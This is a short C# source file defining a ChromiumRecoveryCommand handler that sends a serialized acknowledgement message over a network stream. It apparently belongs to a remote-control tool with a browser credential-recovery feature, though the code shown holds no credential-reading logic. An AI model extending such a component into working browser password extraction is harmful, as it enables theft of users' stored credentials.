using MessagePack;
using SeacoreCommon.Messages;
using System.Net.Sockets;

namespace SeacoreCommon.Commands
{
    public class ChromiumRecoveryCommand : ICommand
    {
        public bool Execute(NetworkStream stream, MessageBase message)
        {
            var ackMessage = new ChromiumRecoveryMessage();
            MessagePackSerializer.Serialize(stream, ackMessage);
            return true;
        }
    }
}
